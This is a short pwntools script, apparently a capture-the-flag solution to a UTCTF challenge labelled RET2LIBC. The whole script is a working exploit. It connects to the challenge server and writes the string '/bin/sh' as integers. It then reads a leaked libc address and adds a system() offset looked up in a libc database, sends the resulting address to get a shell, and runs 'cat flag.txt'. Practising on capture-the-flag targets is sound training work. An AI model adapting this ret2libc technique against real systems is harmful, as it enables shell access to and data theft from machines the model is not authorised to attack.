# [RET2LIBC]
from pwn import *

io = remote("pwn.utctf.live", 5432)

# writing /bin/sh as a int array
io.sendline("3")
io.sendline("1852400175")
io.sendline("6845231")
io.sendline("0")

# Get libc abs address
io.recvuntil("Abs: ")
abs_leak = int(io.recvline()[:-1],0)

# Send whatever you want
io.sendline("0")

#Receive
io.recvline()
io.recvline()
io.recvline()

# Get offset with https://libc.blukat.me
SYSTEM_OFFSET = 0xad60
io.sendline(hex(abs_leak + SYSTEM_OFFSET))
sleep(0.1)
io.sendline("cat flag.txt")
print(io.recvline())

